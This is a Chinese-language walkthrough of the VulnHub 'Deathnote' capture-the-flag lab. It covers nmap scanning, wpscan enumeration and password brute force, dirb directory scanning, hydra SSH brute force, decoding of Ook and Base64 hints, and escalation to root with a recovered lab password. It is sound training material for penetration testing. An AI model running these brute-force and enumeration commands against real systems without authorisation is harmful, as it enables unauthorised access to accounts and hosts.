靶场搭建

靶机下载地址：Deathnote ~ VulnHub

下载后使用 VirtualBox 导入，网络设置为 NAT 模式。攻击机使用 Kali Linux。

信息收集

主机发现
arp-scan -l
端口扫描
nmap --min-rate 10000 -p- 192.168.21.140
nmap -sV -sT -O -p22,80 192.168.21.140

开放端口：22（SSH）、80（HTTP — WordPress）。

robots.txt 与域名绑定

查看 robots.txt 发现 host 绑定提示：

curl http://192.168.21.140/robots.txt

修改本地 hosts 文件：

echo "192.168.21.140 deathnote.vuln" >> /etc/hosts

WordPress 渗透

用户枚举

使用 wpscan 枚举 WordPress 用户：

wpscan --url http://deathnote.vuln/wordpress/ -e u

发现用户 kira。

密码爆破

使用 cewl 从网站生成自定义字典：

cewl http://deathnote.vuln/wordpress/ -w passwd.txt

使用 wpscan 爆破密码：

wpscan --url http://deathnote.vuln/wordpress/ -P passwd.txt -U kira

查看页面 hint 元素后补全密码，成功登录后台。

后台与线索

在 WordPress 后台的 Media（媒体）中发现 notes.txt：

http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt

该文件包含密码提示信息。

SSH 爆破

目录扫描

使用 dirb 扫描 WordPress 目录：

dirb http://deathnote.vuln/wordpress

在 uploads 目录中发现 user.txt 文件，下载到本地。

hydra 爆破

使用 hydra 结合 user.txt（用户名列表）和 notes.txt（密码列表）爆破 SSH：

hydra -L user.txt -P notes.txt ssh://192.168.21.140

成功获取 SSH 凭证：用户 l。

ssh l@192.168.21.140

提权至 root

OoK 解码

登录后查看用户目录，发现 OoK 编码信息。使用在线工具解码（Bugku CTF Brainfuck/OoK 解码器），得到提示指向 kira 用户。

Base64 解码

进入 kira 目录，发现 fake 文件夹中的 16 进制数据：

cGFzc3dkIDoga2lyYWlzZXZpbCA=

Base64 解码得到：passwd : kiraisevil

切换 root 用户：

su root

密码：Kiraisevil

成功获取 root 权限。

Flag

获取 root 权限后读取 flag 文件完成渗透。
